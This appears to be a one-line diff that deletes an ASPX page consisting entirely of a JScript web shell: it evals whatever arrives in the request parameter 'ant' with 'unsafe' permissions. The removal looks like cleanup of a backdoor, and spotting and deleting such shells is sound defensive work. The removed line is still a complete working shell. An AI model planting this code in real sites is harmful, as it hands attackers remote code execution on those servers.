@@ -1,1 +1,0 @@
-﻿<%@ Page Language="Jscript"%><%eval(Request.Item["ant"],"unsafe");%>
